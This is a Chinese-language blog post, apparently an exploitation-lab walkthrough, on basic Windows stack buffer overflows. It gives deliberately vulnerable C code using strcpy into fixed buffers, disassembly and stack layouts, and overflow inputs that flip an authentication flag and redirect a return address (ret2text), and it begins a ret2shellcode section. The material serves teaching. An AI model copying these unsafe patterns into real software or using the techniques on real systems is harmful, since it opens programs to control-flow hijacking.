@@ -167,6 +167,307 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/17/windowsROP/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
+      <meta itemprop="name" content="dustball">
+      <meta itemprop="description" content="dustland">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="dustland">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/09/17/windowsROP/" class="post-title-link" itemprop="url">windows初级ROP</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-09-17 00:59:00" itemprop="dateCreated datePublished" datetime="2022-09-17T00:59:00+08:00">2022-09-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-09-18 20:34:34" itemprop="dateModified" datetime="2022-09-18T20:34:34+08:00">2022-09-18</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="windows初级ROP"><a href="#windows初级ROP" class="headerlink" title="windows初级ROP"></a>windows初级ROP</h1><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="VC-6-0"><a href="#VC-6-0" class="headerlink" title="VC++6.0"></a>VC++6.0</h3><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1jfAzvMvi27zPeiSGNTouQA">https://pan.baidu.com/s/1jfAzvMvi27zPeiSGNTouQA</a><br>提取码：dust</p>
+<p>老古董了</p>
+<p>当编译链接报错的时候试试禁用预编译头,十有八九是他导致的</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916203740037.png" alt="image-20220916203740037"></p>
+<h3 id="windows-XP操作系统"><a href="#windows-XP操作系统" class="headerlink" title="windows XP操作系统"></a>windows XP操作系统</h3><p>去<a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">MSDN, 我告诉你 - 做一个安静的工具站 (itellyou.cn)</a>这里找</p>
+<p>实际在windows11上用VC++6.0也可以做实验,并且比古董XP更方便</p>
+<h2 id="缓冲区溢出修改临近变量"><a href="#缓冲区溢出修改临近变量" class="headerlink" title="缓冲区溢出修改临近变量"></a>缓冲区溢出修改临近变量</h2><p>书上给出的例程长这样</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span><span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> authenticated;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">8</span>]; <span class="comment">// add local buffto be overflowed</span></span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password, PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, password); <span class="comment">// over flowed here!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;please input password: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line">        valid_flag = verify_password(password);</span><br><span class="line">        <span class="keyword">if</span> (valid_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>); </span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>VC++6.0的语法,关于main函数为啥没有返回值类型,入乡随俗吧</p>
+</blockquote>
+<p>主函数里面一个1K字节的password庞然大物,其基地址传递给verify_password函数</p>
+<p>该函数用了一个authenticated变量承载strcmp的返回值,如果输入的密码正确,即password&#x3D;1234567,则strcmp(buffer,password)返回0,authenticated&#x3D;0.否则strcmp根据两个参数的字典序返回正数或者负数</p>
+<p>为了故意制造漏洞,书上在strcmp函数调用结束之后用strcmp将password拷贝到buffer上了strcpy(buffer, password); </p>
+<p>下面动态调试verify_password函数,观察其栈帧的分布</p>
+<p>用ollydbg,VC++6.0,ida等等调试均可</p>
+<h3 id="开端"><a href="#开端" class="headerlink" title="开端"></a>开端</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">5:    int verify_password(char *password)</span><br><span class="line">6:    &#123;</span><br><span class="line">00401020   push        ebp	;保存调用者帧指针,返回时实现堆栈平衡</span><br><span class="line">00401021   mov         ebp,esp;ebp指向当前函数栈帧底部</span><br><span class="line">00401023   sub         esp,4Ch;栈顶下降0x4C</span><br><span class="line">00401026   push        ebx;被调用者保存寄存器</span><br><span class="line">00401027   push        esi</span><br><span class="line">00401028   push        edi</span><br><span class="line">00401029   lea         edi,[ebp-4Ch]</span><br><span class="line">0040102C   mov         ecx,13h</span><br><span class="line">00401031   mov         eax,0CCCCCCCCh</span><br><span class="line">00401036   rep stos    dword ptr [edi];将eax的值拷贝到edi指向的字符串,重复次数ecx=0x13次</span><br></pre></td></tr></table></figure>
+
+<h3 id="声明两个局部变量"><a href="#声明两个局部变量" class="headerlink" title="声明两个局部变量"></a>声明两个局部变量</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span>:        <span class="type">int</span> authenticated;</span><br><span class="line"><span class="number">8</span>:        <span class="type">char</span> buffer[<span class="number">8</span>]; <span class="comment">// add local buffto be overflowed</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到并没有对应的汇编指令,这是因为编译原理中,声明语句不生成可执行代码,只是起到规定符号类型的作用</p>
+<h3 id="调用strcmp计算authenticated"><a href="#调用strcmp计算authenticated" class="headerlink" title="调用strcmp计算authenticated"></a>调用strcmp计算authenticated</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">9:        authenticated = strcmp(password, PASSWORD);</span><br><span class="line">00401038   push        offset string &quot;1234567&quot; (0042501c)</span><br><span class="line">0040103D   mov         eax,dword ptr [ebp+8]</span><br><span class="line">00401040   push        eax</span><br><span class="line">00401041   call        strcmp (00401250)</span><br><span class="line">00401046   add         esp,8</span><br><span class="line">00401049   mov         dword ptr [ebp-4],eax</span><br></pre></td></tr></table></figure>
+
+<p>这个strcmp起到了验证输入密码是否正确的作用</p>
+<p>stdcall调用约定,使用栈传递参数,最先push入栈的”1234567”的地址作为第二个参数,后来连push入栈的ebp+8作为第一个参数</p>
+<p>局部变量都是在本函数栈帧内部的,他们在栈中的地址总是ebp减去某个数,而现在ebp+8这个地址显然不是当前函数栈内的局部变量,是调用者压栈传递的参数password</p>
+<p>strcmp调用返回之后立刻抬栈8个字节,这就消去了为了调用strcmp压入的两个参数,调用strcmp前后堆栈平衡</p>
+<p>stdcall中,strcmp返回值放在eax寄存器中,拷贝到栈上ebp-4位置,这意味着ebp-4是authenticated的位置,它紧挨着栈底</p>
+<h3 id="画蛇添足造成漏洞"><a href="#画蛇添足造成漏洞" class="headerlink" title="画蛇添足造成漏洞"></a>画蛇添足造成漏洞</h3><p>到了故意写上的strcpy了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span>:       <span class="built_in">strcpy</span>(buffer, password); <span class="comment">// over flowed here!</span></span><br><span class="line"><span class="number">0040104</span>C   mov         ecx,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">0040104F</span>   push        ecx</span><br><span class="line"><span class="number">00401050</span>   lea         edx,[ebp<span class="number">-0</span>Ch]</span><br><span class="line"><span class="number">00401053</span>   push        edx</span><br><span class="line"><span class="number">00401054</span>   call        <span class="title function_">strcpy</span> <span class="params">(<span class="number">00401160</span>)</span></span><br><span class="line">00401059   add         esp,8</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>ebp+8指向调用者压入的password字符串地址</p>
+<p>ebp-0xC看来就是buffer的基地址了</p>
+<p>然后调用strcpy从ebp+8拷贝字符串到ebp-0xC,啥时候碰到’\0’字符,啥时候拷贝结束</p>
+<p>调用完成后抬栈8个字节,实现strcpy前后堆栈平衡</p>
+<p>到此可以画出verify_password的栈帧分布了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916164950680.png" alt="image-20220916164950680"></p>
+<p>buffer的长度为8,如果输入8个字符,正好填满buffer,还多出一个’\0’结束字符,不得不放到authenticated上了,这就溢出覆盖了</p>
+<p>然后authenticated被返回</p>
+<p>而main函数中就是凭verify_password的返回值决定是否输入了正确的密码</p>
+<p>这里需要让valid_flag即verify_password的返回值为0才可以跳过if,进入else</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (valid_flag)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>); </span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样看来我们只需要输入00000000,八个0,最后多一个’\0’正好覆盖了authenticated,让他等于0.</p>
+<p>然而这只是覆盖了它的最低一个字节,authenticated有4个字节.</p>
+<p>“那么可以输入11个0,然后自带一个’\0’,一共12个0,这样authenticated被溢出成全0了”,这样想更不对,因为0的ASCII码是0x30,</p>
+<p>这样输入之后相当于authenticated&#x3D;0x00303030&#x3D;3158064</p>
+<p>实际上调试的时候正是如此</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916170428996.png" alt="image-20220916170428996"></p>
+<p>‘\0’是真的0,NULL,字符’0’是假的0,那应该再咋办呢</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">authenticated = <span class="built_in">strcmp</span>(password, PASSWORD)</span><br></pre></td></tr></table></figure>
+
+<p>当字典序password&lt;PASSWORD时,返回的是负数,那么authenticated的高位全都是1,(不管高几位是1了,反正最高位那个符号位是1)</p>
+<p>当字典序password&gt;PASSWROD时,返回的是正数,那么authenticated的高位全都是0了,这就有一个问题,高几位是0,如果高3个字节都是0则正好’\0’将最低字节也溢出成0,如果第二个字节非0就寄了</p>
+<p>怎么验证这个事呢?要么直接调试看看,要么看strcmp的源代码</p>
+<p>显然前者来的快,调试观察,结果是1,竟然不是一个乱七八糟的正数</p>
+<blockquote>
+<p>逆向分析strcmp,其函数出口只有两个</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916174314360.png" alt="image-20220916174314360"></p>
+<p>要么是doneeq处作为出口,这里返回eax&#x3D;0</p>
+<p>要么是donene处作为出口,这里干了啥呢?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00401294 donene:                 ; done not equals</span><br><span class="line">.text:00401294 sbb     eax, eax</span><br><span class="line">.text:00401296 shl     eax, 1</span><br><span class="line">.text:00401298 inc     eax</span><br><span class="line">.text:00401299 retn</span><br></pre></td></tr></table></figure>
+
+<p>sbb,带借位减法,sbb a,b意思是a&#x3D;a-b-CF</p>
+<p>那么sbb eax,eax的意思就是eax&#x3D;eax-eax-CF&#x3D;-CF</p>
+<p>而CF的值来自于两个字符串逐个字节做差,strcmp(a,b)&#x3D;a-b,如果a&lt;b则CF&#x3D;1否则即a&gt;&#x3D;b则CF&#x3D;0</p>
+<p>然后shl带进位左移,左移的时候最低位用CF补上</p>
+<p>如果CF&#x3D;0则eax&#x3D;-0&#x3D;0然后左移的时候低位补CF&#x3D;0,还是0,最后inc eax导致变成1</p>
+<p>因此如果a的字典序更大,则strcmp只会返回1</p>
+</blockquote>
+<p>那么只需要输入2222222,七个2再加上’\0’,就可以保证字典序大于1234567,eax返回1放到authenticated最低位,高三位都是0,然后’\0’溢出修改authenticated最低字节,得到全0的authenticated,这就跳过了if的检查</p>
+<h2 id="溢出返回地址"><a href="#溢出返回地址" class="headerlink" title="溢出返回地址"></a>溢出返回地址</h2><p>在verify_password函数的栈帧视角下,返回地址在ebp+4处</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916192819674.png" alt="image-20220916192819674"></p>
+<p>从ebp-0xC到ebp+0x4共16字节,输入15个字节之后加上’\0’,正好到达返回地址的家门口</p>
+<p>单反再多输入一个字节,就要修改返回地址了</p>
+<p>输入19个’A’再加上一个’\0’则返回地址被修改为0x00414141(0x41是’A’的ASCII编码)</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916193417926.png" alt="image-20220916193417926"></p>
+<p>Buffer[0x19FACC,0x19FAD4)&#x3D;0x4141414141414141</p>
+<p>authenticated[0x19FAD4,0x19FAD8)&#x3D;0x41414141</p>
+<p>调用者ebp[0x19FAD8,0x19FADC)&#x3D;0x41414141</p>
+<p>返回地址[0x19FADC,0x19FAE0)&#x3D;0x00414141</p>
+<p>溢出之后再继续单步调试会变地很艰难,每一步都要等五六秒,最后retn指令之后eip将指向0x00414141处,跑飞了</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916194149675.png" alt="image-20220916194149675"></p>
+<p>在windowsXP上尝试运行然后输入19个A,windows会报错</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916194359820.png" alt="image-20220916194359820"></p>
+<p>在eip&#x3D;0x414141处发生了0x80000003号错误</p>
+<blockquote>
+<p>STATUS_BREAKPOINT，值为0x80000003，称为中断指令异常，表示在系统未附加内核调试器时遇到断点或断言。</p>
+</blockquote>
+<p>确实如此,0x00414141处全都是0xCC</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916194604144.png" alt="image-20220916194604144"></p>
+<p>而int 3中断指令的机器码恰好就是0xCC,因此CPU认为碰到了没有定义的断点,报错了</p>
+<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>上一个实验中,由于终端上只能输入可打印ASCII字符,这就限制了我们可以输入的地址</p>
+<p>为了表演如何劫持控制,书上将输入改成了文件,这就允许输入不可打印ASCII字符了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span><span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> authenticated;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">	authenticated = <span class="built_in">strcmp</span>(password, PASSWORD);</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer, password); <span class="comment">// over flowed here!</span></span><br><span class="line">	<span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">	FILE *fp;</span><br><span class="line">	<span class="keyword">if</span> (!(fp = fopen(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;rw+&quot;</span>)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line">	valid_flag = verify_password(password);</span><br><span class="line">	<span class="keyword">if</span> (valid_flag)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="确定栈帧分布"><a href="#确定栈帧分布" class="headerlink" title="确定栈帧分布"></a>确定栈帧分布</h3><p>main函数给password预留了1024个字节,足够了,只需要考虑verify_password函数的栈帧分布</p>
+<p>在项目根目录下面新建一个password.txt文档然后随便输入几个字符,开始调试</p>
+<blockquote>
+<p>按理说应该是exe同目录,即Debug目录,但是在哪里建立之后程序找不到password.txt文件</p>
+<p>exe同目录或者项目根目录都建立一个,以防万一</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">10:       strcpy(buffer, password); // over flowed here!</span><br><span class="line">0040104C   mov         ecx,dword ptr [ebp+8]</span><br><span class="line">0040104F   push        ecx</span><br><span class="line">00401050   lea         edx,[ebp-0Ch]</span><br><span class="line">00401053   push        edx</span><br><span class="line">00401054   call        strcpy (00401180)</span><br><span class="line">00401059   add         esp,8</span><br></pre></td></tr></table></figure>
+
+<p>ebp+8是调用者传过来的参数,password的指针</p>
+<p>ebp-0xC是buffer缓冲区地址</p>
+<p>可以画出栈帧了,和刚才的实验中是一样的</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916200536665.png" alt="image-20220916200536665"></p>
+<h3 id="溢出修改返回地址"><a href="#溢出修改返回地址" class="headerlink" title="溢出修改返回地址"></a>溢出修改返回地址</h3><p>现在企图溢出修改返回地址,直接跳转到main中打印通过的信息处</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">30:           printf(&quot;Congratulation! You have passed the verification!\n&quot;);</span><br><span class="line">0040111F   push        offset string &quot;Congratulation! You have passed &quot;... (00426028)</span><br><span class="line">00401124   call        printf (00401420)</span><br><span class="line">00401129   add         esp,4</span><br></pre></td></tr></table></figure>
+
+<p>即直接将返回地址溢出修改成0x0040111F就可以了,咋溢出呢?</p>
+<p>前16个字节溢出成任意字符,然后输入三个字节,0x1F,0x11,0x40,总共19个字节了,然后最高位’\0’填充</p>
+<p>问题是0x1F,0x11都是不可打印ASCII字符,怎么输入呢?</p>
+<table>
+<thead>
+<tr>
+<th>二进制</th>
+<th>十进制</th>
+<th>十六进制</th>
+<th>字符</th>
+<th>意义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>00011111</td>
+<td>31</td>
+<td>1F</td>
+<td>US (Unit Separator)</td>
+<td>单元分隔符</td>
+</tr>
+<tr>
+<td>00010001</td>
+<td>17</td>
+<td>11</td>
+<td>DC1&#x2F;XON (Device Control 1&#x2F;Transmission On)</td>
+<td>设备控制1&#x2F;传输开始</td>
+</tr>
+<tr>
+<td>01000000</td>
+<td>64</td>
+<td>40</td>
+<td>@</td>
+<td></td>
+</tr>
+</tbody></table>
+<p>首先在password.txt中编辑1234567812341234abc这么19个字符,其中前16个阿拉伯数字全是填充,后面abc是需要修改的地方</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916201320178.png" alt="image-20220916201320178"></p>
+<p>保存好后用010editor打开password.txt</p>
+<p>View-&gt;Edit As-&gt;Hex</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916201500309.png" alt="image-20220916201500309"></p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916201527444.png" alt="image-20220916201527444"></p>
+<p>将最后三个字节,改成0x1F,0x11,0x40</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916201618020.png" alt="image-20220916201618020"></p>
+<p>然后保存,再运行程序</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\StackOverFlow\controlflow\Debug&gt; ./controlflow</span><br><span class="line">Congratulation! You have passed the verification!</span><br></pre></td></tr></table></figure>
+
+<p>已经可以”通过检查”了,下面调试观察发生了什么</p>
+<h3 id="调试观察"><a href="#调试观察" class="headerlink" title="调试观察"></a>调试观察</h3><p>首先,verify_password中strcpy执行之后,栈帧的状态</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916202117461.png" alt="image-20220916202117461"></p>
+<p>EBP&#x3D;0x19FAD4,这意味着返回地址在0x19FAD8,内存视图中可以看出,0x19FAD8开始的四个字节已经被溢出成0x0040111F了</p>
+<p>继续执行直到retn指令,返回之后</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916202219964.png" alt="image-20220916202219964"></p>
+<p>EIP顺势被修改为0x0040111F,达到了目的</p>
+<p>此时EBP帧指针指向0x34333231,显然已经飞了,不是main函数的帧底,但是ESP指向栈顶是没错的,</p>
+<p>编译器会计算好函数返回时esp要抬多少,但是ebp是纯靠程序压栈记忆的</p>
+<p>这个过程画到图上就是书上给的</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916202508235.png" alt="image-20220916202508235"></p>
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>上一个实验中将控制篡改到main函数中,还是属于代码段的,</p>
+<p>这个实验要向栈中写入代码然后篡改返回地址,执行栈中代码.</p>
+<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916202944899.png" alt="image-20220916202944899"></p>
+<p>要在栈中写一段创建MessageBoxA的shellcode,让程序弹窗</p>
+<p>需要pwn的程序长这样</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//确保可以调用windows API </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span><span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> authenticated;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">44</span>];<span class="comment">//缓冲区扩大到44个字节,方便容纳shellcode</span></span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password, PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, password); <span class="comment">// over flowed here!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    FILE *fp;</span><br><span class="line">    LoadLibrary(<span class="string">&quot;user32.dll&quot;</span>); <span class="comment">// prepare for messagebox</span></span><br><span class="line">    <span class="keyword">if</span> (!(fp = fopen(<span class="string">&quot;password.txt&quot;</span>, <span class="string">&quot;rw+&quot;</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line">    valid_flag = verify_password(password);</span><br><span class="line">    <span class="keyword">if</span> (valid_flag)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>还是从password.txt中写东西,溢出verify_password.txt的buffer缓冲区</p>
